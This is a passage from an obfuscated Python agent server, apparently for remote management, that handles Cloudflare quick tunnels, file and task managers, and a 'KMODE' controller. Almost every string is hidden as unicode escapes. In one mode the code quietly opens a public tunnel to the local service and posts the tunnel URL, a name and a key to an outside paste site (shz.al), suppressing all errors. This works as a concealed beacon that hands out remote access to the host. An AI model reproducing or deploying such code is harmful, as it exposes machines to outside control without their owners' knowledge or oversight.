        self._thread = threading.Thread(target=self._run_loop, args=(O0_var_779, O0_var_780, O0_var_781), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002d\\u0025\\u0064', 'unicode_escape') % self.port)
        self._thread.start()
        return self.hostname

    def _run_loop(self, O0_var_782, O0_var_783, O0_var_784):
        while not self._stop.is_set():
            O0_var_785 = None
            try:
                O0_var_785 = O0_fn_23(self.verify_certificate, self.log)
                self._sock = O0_var_785
                H2Connection(O0_var_785, self.origin, O0_var_782, O0_var_783, O0_var_784, 0, self.log, self.hostname, not self.silent, self._tunnel_state).run()
            except KeyboardInterrupt:
                return
            except (OSError, EOFError, ValueError) as exc:
                self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
            finally:
                if O0_var_785 is not None:
                    try:
                        O0_var_785.close()
                    except OSError:
                        pass
                self._sock = None
            if self._stop.is_set():
                return
            self._stop.wait(self.retry_seconds)

    def stop(self):
        self._stop.set()
        O0_var_786 = self._sock
        if O0_var_786 is not None:
            try:
                O0_var_786.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                O0_var_786.close()
            except OSError:
                pass
        if self._thread is not None:
            self._thread.join(timeout=2)

class ArgoTunnelError(Exception):

    def __init__(self, status_code, message):
        super().__init__(message)
        self.status_code = status_code
        self.message = message

class ArgoTunnelManager:

    def __init__(self, logger=None):
        self._tunnels = []
        self._by_port = {}
        self._lock = threading.Lock()
        self.log = logger if logger is not None else _ArgoLogAdapter()

    def list_tunnels(self):
        with self._lock:
            return [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_787.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_787.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_787.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))} for O0_var_787 in self._tunnels if O0_var_787.hostname is not None]

    def create_tunnel(self, port, duplicate=False, silent=False):
        with self._lock:
            if self._by_port.get(port) and (not duplicate):
                raise ArgoTunnelError(409, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape') % port)
        O0_var_788 = CloudflareQuickTunnel(port=port, logger=self.log, silent=silent)
        try:
            O0_var_788.start()
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), port, exc)
            raise ArgoTunnelError(500, codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % exc) from exc
        with self._lock:
            self._tunnels.append(O0_var_788)
            self._by_port.setdefault(port, []).append(O0_var_788)
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064', 'unicode_escape'): True, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_788.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_788.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))}

    def delete_tunnel(self, port, tunnel_domain=None):
        with self._lock:
            O0_var_789 = self._by_port.get(port) or []
            if not O0_var_789:
                raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064', 'unicode_escape') % port)
            if tunnel_domain is not None:
                O0_var_790 = [O0_var_791 for O0_var_791 in O0_var_789 if O0_var_791.hostname == tunnel_domain]
                if not O0_var_790:
                    raise ArgoTunnelError(404, codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u0020\\u0077\\u0069\\u0074\\u0068\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0025\\u0073', 'unicode_escape') % (port, tunnel_domain))
            elif len(O0_var_789) > 1:
                raise ArgoTunnelError(409, codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u006c\\u0065\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0025\\u0064\\u002c\\u0020\\u0073\\u0070\\u0065\\u0063\\u0069\\u0066\\u0079\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0074\\u006f\\u0020\\u0064\\u0069\\u0073\\u0061\\u006d\\u0062\\u0069\\u0067\\u0075\\u0061\\u0074\\u0065', 'unicode_escape') % port)
            else:
                O0_var_790 = list(O0_var_789)
            O0_var_792 = [O0_var_793 for O0_var_793 in O0_var_789 if O0_var_793 not in O0_var_790]
            if O0_var_792:
                self._by_port[port] = O0_var_792
            else:
                self._by_port.pop(port, None)
            self._tunnels = [O0_var_794 for O0_var_794 in self._tunnels if O0_var_794 not in O0_var_790]
            O0_var_795 = [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_796.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_796.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_796.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))} for O0_var_796 in O0_var_790]
        for O0_var_797 in O0_var_790:
            O0_var_797.stop()
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0064\\u0065\\u006c\\u0065\\u0074\\u0065\\u0064', 'unicode_escape'): len(O0_var_790), codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): port, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0073', 'unicode_escape'): O0_var_795}

    def stop_all(self):
        with self._lock:
            O0_var_798 = list(self._tunnels)
            self._tunnels.clear()
            self._by_port.clear()
        for O0_var_799 in O0_var_798:
            O0_var_799.stop()

class KModeController:
    _baseinfo_hooked = False
    _domain = None
    _SHZAL_NAME_CHARS = set(codecs.decode('\\u0061\\u0062\\u0063\\u0064\\u0065\\u0066\\u0067\\u0068\\u0069\\u006a\\u006b\\u006c\\u006d\\u006e\\u006f\\u0070\\u0071\\u0072\\u0073\\u0074\\u0075\\u0076\\u0077\\u0078\\u0079\\u007a\\u0041\\u0042\\u0043\\u0044\\u0045\\u0046\\u0047\\u0048\\u0049\\u004a\\u004b\\u004c\\u004d\\u004e\\u004f\\u0050\\u0051\\u0052\\u0053\\u0054\\u0055\\u0056\\u0057\\u0058\\u0059\\u005a\\u0030\\u0031\\u0032\\u0033\\u0034\\u0035\\u0036\\u0037\\u0038\\u0039\\u002b\\u005f\\u002d\\u005b\\u005d\\u002a\\u0024\\u003d\\u0040\\u002c\\u003b\\u002f', 'unicode_escape'))

    @classmethod
    def kname_valid(cls):
        O0_var_800 = Config.KNAME
        return len(O0_var_800) >= 3 and set(O0_var_800) <= cls._SHZAL_NAME_CHARS

    @classmethod
    def report_shzal(cls, domain):
        O0_var_801, O0_var_802 = (Config.KNAME, Config.KNAME_KEY or Config.KNAME)
        import urllib.error
        import urllib.request
        import uuid
        O0_var_803 = codecs.decode('\\u002d\\u002d\\u002d\\u002d\\u006b\\u0069\\u0073\\u0061\\u006d\\u0061', 'unicode_escape') + uuid.uuid4().hex

        def body(O0_var_804):
            O0_var_805 = []
            for O0_var_806, O0_var_807 in O0_var_804:
                O0_var_805.append((codecs.decode('\\u002d\\u002d', 'unicode_escape') + str(O0_var_803) + codecs.decode('\\u000d\\u000a\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0044\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u003b\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022', 'unicode_escape') + str(O0_var_806) + codecs.decode('\\u0022\\u000d\\u000a\\u000d\\u000a', 'unicode_escape') + str(O0_var_807) + codecs.decode('\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            O0_var_805.append((codecs.decode('\\u002d\\u002d', 'unicode_escape') + str(O0_var_803) + codecs.decode('\\u002d\\u002d\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')))
            return b''.join(O0_var_805)

        def post(O0_var_808, O0_var_809, method=codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')):
            O0_var_810 = urllib.request.Request(O0_var_808, data=body(O0_var_809), method=method)
            O0_var_810.add_header(codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('\\u006d\\u0075\\u006c\\u0074\\u0069\\u0070\\u0061\\u0072\\u0074\\u002f\\u0066\\u006f\\u0072\\u006d\\u002d\\u0064\\u0061\\u0074\\u0061\\u003b\\u0020\\u0062\\u006f\\u0075\\u006e\\u0064\\u0061\\u0072\\u0079\\u003d', 'unicode_escape') + str(O0_var_803))
            O0_var_810.add_header(codecs.decode('\\u0055\\u0073\\u0065\\u0072\\u002d\\u0041\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u0075\\u0072\\u006c\\u002f\\u0038\\u002e\\u0035\\u002e\\u0030', 'unicode_escape'))
            return urllib.request.urlopen(O0_var_810, timeout=30)
        try:
            O0_var_811 = [(codecs.decode('\\u0063', 'unicode_escape'), domain), (codecs.decode('\\u006e', 'unicode_escape'), O0_var_801), (codecs.decode('\\u0073', 'unicode_escape'), O0_var_802), (codecs.decode('\\u0065', 'unicode_escape'), codecs.decode('\\u0037\\u0064', 'unicode_escape'))]
            try:
                post(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f', 'unicode_escape'), O0_var_811)
            except urllib.error.HTTPError as exc:
                if exc.code == 409:
                    post(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0073\\u0068\\u007a\\u002e\\u0061\\u006c\\u002f\\u007e', 'unicode_escape') + str(O0_var_801) + codecs.decode('\\u003a', 'unicode_escape') + str(O0_var_802), [O0_var_812 for O0_var_812 in O0_var_811 if O0_var_812[0] != codecs.decode('\\u006e', 'unicode_escape')], method=codecs.decode('\\u0050\\u0055\\u0054', 'unicode_escape'))
                else:
                    raise
            cls._domain = domain
        except Exception:
            pass

    @staticmethod
    def _home_dir():
        for O0_var_813 in (os.environ.get(codecs.decode('\\u0055\\u0053\\u0045\\u0052\\u0050\\u0052\\u004f\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')), os.environ.get(codecs.decode('\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')), os.path.expanduser(codecs.decode('\\u007e', 'unicode_escape'))):
            if O0_var_813 and os.path.isdir(O0_var_813):
                return O0_var_813
        return os.getcwd()

    @classmethod
    def resolve_domain_file_path(cls):
        O0_var_814 = Config.KPATH.strip()
        if not O0_var_814:
            return os.path.join(cls._home_dir(), codecs.decode('\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u002e\\u0074\\u0078\\u0074', 'unicode_escape'))
        if O0_var_814.startswith(codecs.decode('\\u0024\\u0048\\u004f\\u004d\\u0045', 'unicode_escape')):
            O0_var_814 = os.path.join(cls._home_dir(), O0_var_814[5:].lstrip(codecs.decode('\\u002f\\u005c', 'unicode_escape'))) if len(O0_var_814) > 5 else cls._home_dir()
        elif O0_var_814.startswith(codecs.decode('\\u007e', 'unicode_escape')):
            O0_var_814 = os.path.expanduser(O0_var_814)
        return O0_var_814

    @classmethod
    def write_domain_file(cls, domain):
        cls._domain = domain
        O0_var_815 = cls.resolve_domain_file_path()
        try:
            O0_var_816 = os.path.dirname(os.path.abspath(O0_var_815))
            if O0_var_816:
                os.makedirs(O0_var_816, exist_ok=True)
            with open(O0_var_815, codecs.decode('\\u0077', 'unicode_escape'), encoding=codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) as O0_var_817:
                O0_var_817.write(domain)
            Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f4c4\\u0020\\u96a7\\u9053\\u57df\\u540d\\u5df2\\u5199\\u5165\\u003a\\u0020', 'unicode_escape') + str(O0_var_815))
        except OSError as exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5199\\u5165\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_815) + codecs.decode('\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))

    @classmethod
    def delete_domain_file(cls):
        O0_var_818 = cls.resolve_domain_file_path()
        try:
            if os.path.isfile(O0_var_818):
                os.remove(O0_var_818)
                Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f5d1\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5df2\\u5220\\u9664\\u003a\\u0020', 'unicode_escape') + str(O0_var_818))
        except OSError as exc:
            Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u57df\\u540d\\u6587\\u4ef6\\u5220\\u9664\\u5931\\u8d25\\u0020\\u0028', 'unicode_escape') + str(O0_var_818) + codecs.decode('\\u0029\\u003a\\u0020', 'unicode_escape') + str(exc))

    @classmethod
    def on_baseinfo_success(cls):
        if not cls._baseinfo_hooked:
            cls._baseinfo_hooked = True
            cls.delete_domain_file()

    @classmethod
    def _stdin_loop(cls):
        while True:
            try:
                O0_var_819 = sys.stdin.readline()
            except Exception:
                return
            if not O0_var_819:
                return
            if O0_var_819.strip() == codecs.decode('\\u002f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'):
                if cls._domain:
                    print(cls._domain, flush=True)
                else:
                    print(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u006e\\u006f\\u0074\\u0020\\u0072\\u0065\\u0061\\u0064\\u0079', 'unicode_escape'), flush=True)

    @classmethod
    def _tunnel_task(cls, manager, after_domain=None, silent=False):
        try:
            manager.create_tunnel(Config.PORT, silent=silent)
        except Exception as exc:
            if not silent:
                Logger.warning(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\u26a0\\ufe0f\\u0020\\u542f\\u52a8\\u96a7\\u9053\\u521b\\u5efa\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(exc))
            return
        O0_var_820 = manager.list_tunnels()
        if not O0_var_820:
            return
        O0_var_821 = O0_var_820[-1][codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape')]
        if after_domain:
            after_domain(O0_var_821)
        else:
            cls.write_domain_file(O0_var_821)

    @classmethod
    def activate(cls, manager):
        if Config.KMODE == codecs.decode('\\u0032', 'unicode_escape') and cls.kname_valid():
            Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f680\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0032\\u003a\\u0020\\u96a7\\u9053\\u57df\\u540d\\u5c06\\u4e0a\\u62a5\\u81f3\\u5916\\u90e8\\u5e73\\u53f0', 'unicode_escape'))
            threading.Thread(target=cls._tunnel_task, args=(manager,), kwargs={codecs.decode('\\u0061\\u0066\\u0074\\u0065\\u0072\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): cls.report_shzal, codecs.decode('\\u0073\\u0069\\u006c\\u0065\\u006e\\u0074', 'unicode_escape'): True}, daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')).start()
            return
        Logger.info(codecs.decode('\\u005b\\u004b\\u004d\\u004f\\u0044\\u0045\\u005d\\u0020\\U0001f680\\u0020\\u004b\\u004d\\u004f\\u0044\\u0045\\u003d\\u0031\\u003a\\u0020\\u542f\\u52a8\\u65f6\\u81ea\\u52a8\\u521b\\u5efa\\u4e34\\u65f6\\u96a7\\u9053', 'unicode_escape'))
        threading.Thread(target=cls._tunnel_task, args=(manager,), daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c', 'unicode_escape')).start()
        threading.Thread(target=cls._stdin_loop, daemon=True, name=codecs.decode('\\u006b\\u006d\\u006f\\u0064\\u0065\\u002d\\u0073\\u0074\\u0064\\u0069\\u006e', 'unicode_escape')).start()

class ArgoTunnelInfo(BaseModel):
    tunnel_domain: str = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7684\\u672c\\u5730\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: str = Field(..., description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])

class ArgoTunnelListResponse(SResponse):
    count: int = Field(..., description=codecs.decode('\\u96a7\\u9053\\u6570\\u91cf', 'unicode_escape'), examples=[1])
    tunnels: List[ArgoTunnelInfo] = Field(..., description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u5217\\u8868', 'unicode_escape'), examples=[[]])

class ArgoTunnelCreateRequest(BaseModel):
    port: Optional[int] = Field(default=None, ge=1, le=65535, description=codecs.decode('\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3\\u002c\\u0020\\u7f3a\\u7701\\u4f7f\\u7528\\u0020\\u0061\\u0067\\u0065\\u006e\\u0074\\u0020\\u81ea\\u8eab\\u76d1\\u542c\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    duplicate: bool = Field(default=False, description=codecs.decode('\\u662f\\u5426\\u5141\\u8bb8\\u540c\\u4e00\\u7aef\\u53e3\\u91cd\\u590d\\u5efa\\u96a7\\u9053\\u0020\\u0028\\u9ed8\\u8ba4\\u0020\\u0066\\u0061\\u006c\\u0073\\u0065\\u0029', 'unicode_escape'), examples=[False])

class ArgoTunnelCreateResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    created: bool = Field(..., description=codecs.decode('\\u96a7\\u9053\\u521b\\u5efa\\u7ed3\\u679c', 'unicode_escape'), examples=[True])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u4e34\\u65f6\\u96a7\\u9053\\u516c\\u7f51\\u57df\\u540d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    created_at: Optional[str] = Field(default=None, description=codecs.decode('\\u521b\\u5efa\\u65f6\\u95f4\\u0020\\u0028\\u0049\\u0053\\u004f\\u0038\\u0036\\u0030\\u0031\\u0020\\u0055\\u0054\\u0043\\u0029', 'unicode_escape'), examples=[codecs.decode('\\u0032\\u0030\\u0032\\u0036\\u002d\\u0030\\u0038\\u002d\\u0031\\u0038\\u0054\\u0031\\u0030\\u003a\\u0030\\u0030\\u003a\\u0030\\u0030\\u005a', 'unicode_escape')])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0061\\u006c\\u0072\\u0065\\u0061\\u0064\\u0079\\u0020\\u0065\\u0078\\u0069\\u0073\\u0074\\u0073\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030\\u002c\\u0020\\u0073\\u0065\\u0074\\u0020\\u0064\\u0075\\u0070\\u006c\\u0069\\u0063\\u0061\\u0074\\u0065\\u003d\\u0074\\u0072\\u0075\\u0065\\u0020\\u0074\\u006f\\u0020\\u0066\\u006f\\u0072\\u0063\\u0065\\u0020\\u0063\\u0072\\u0065\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape')])

class ArgoTunnelDeleteRequest(BaseModel):
    port: int = Field(..., ge=1, le=65535, description=codecs.decode('\\u8981\\u5220\\u9664\\u7684\\u96a7\\u9053\\u8f6c\\u53d1\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnel_domain: Optional[str] = Field(default=None, description=codecs.decode('\\u540c\\u7aef\\u53e3\\u591a\\u96a7\\u9053\\u65f6\\u7528\\u4e8e\\u7cbe\\u786e\\u5b9a\\u4f4d', 'unicode_escape'), examples=[codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006c\\u0075\\u0063\\u006b\\u0079\\u002d\\u0077\\u0069\\u006c\\u0064\\u0066\\u006c\\u006f\\u0077\\u0065\\u0072\\u002d\\u0031\\u0061\\u0032\\u0062\\u0033\\u0063\\u0034\\u0064\\u002e\\u0074\\u0072\\u0079\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u002e\\u0063\\u006f\\u006d', 'unicode_escape')])

class ArgoTunnelDeleteResponse(BaseModel):
    status: str = Field(..., description=codecs.decode('\\u0022\\u006f\\u006b\\u0022\\u0020\\u6216\\u0020\\u0022\\u0065\\u0072\\u0072\\u006f\\u0072\\u0022', 'unicode_escape'), examples=[codecs.decode('\\u006f\\u006b', 'unicode_escape')])
    deleted: int = Field(..., description=codecs.decode('\\u5b9e\\u9645\\u5220\\u9664\\u7684\\u96a7\\u9053\\u6570\\u91cf\\u0020\\u0028\\u6210\\u529f\\u65f6\\u0020\\u003e\\u003d\\u0031\\u0029', 'unicode_escape'), examples=[1])
    port: int = Field(..., description=codecs.decode('\\u672c\\u6b21\\u8bf7\\u6c42\\u7684\\u7aef\\u53e3', 'unicode_escape'), examples=[8000])
    tunnels: Optional[List[ArgoTunnelInfo]] = Field(default=None, description=codecs.decode('\\u5df2\\u5220\\u9664\\u96a7\\u9053\\u7684\\u660e\\u7ec6', 'unicode_escape'), examples=[[]])
    message: Optional[str] = Field(default=None, description=codecs.decode('\\u5931\\u8d25\\u539f\\u56e0', 'unicode_escape'), examples=[codecs.decode('\\u006e\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064\\u0020\\u006f\\u006e\\u0020\\u0070\\u006f\\u0072\\u0074\\u0020\\u0038\\u0030\\u0030\\u0030', 'unicode_escape')])

@asynccontextmanager
async def O0_fn_24(app: FastAPI):
    Logger.debug(codecs.decode('\\U0001f527\\u0020\\u521d\\u59cb\\u5316\\u7ba1\\u7406\\u5668\\u002e\\u002e\\u002e', 'unicode_escape'))
    Config.validate()
    O0_fn_2()
    app.state.file_manager = FileManager(root=Config.FILE_ROOT, max_upload=Config.MAX_UPLOAD_SIZE, chunk_size=int(os.getenv(codecs.decode('\\u0043\\u0048\\u0055\\u004e\\u004b\\u005f\\u0054\\u0048\\u0052\\u0045\\u0053\\u0048\\u004f\\u004c\\u0044', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0039\\u0037\\u0031\\u0035\\u0032\\u0030', 'unicode_escape'))), audit=Config.FILE_AUDIT_LOG)
    app.state.task_manager = TaskManager(timeout=Config.TASK_TIMEOUT, check_interval=Config.CRON_CHECK_INTERVAL)
    app.state.temp_key_manager = TempKeyManager()
    app.state.temp_key_manager.on_expired = Config.rotate_operational_secrets
    app.state.argo_tunnel_manager = ArgoTunnelManager()
    if Config.KMODE == codecs.decode('\\u0031', 'unicode_escape') or (Config.KMODE == codecs.decode('\\u0032', 'unicode_escape') and KModeController.kname_valid()):
        KModeController.activate(app.state.argo_tunnel_manager)
    if Config.DEBUG:
        Logger.debug(codecs.decode('\\u2705\\u0020\\u7ba1\\u7406\\u5668\\u5df2\\u6302\\u8f7d\\u5230\\u0020\\u0061\\u0070\\u0070\\u002e\\u0073\\u0074\\u0061\\u0074\\u0065', 'unicode_escape'))
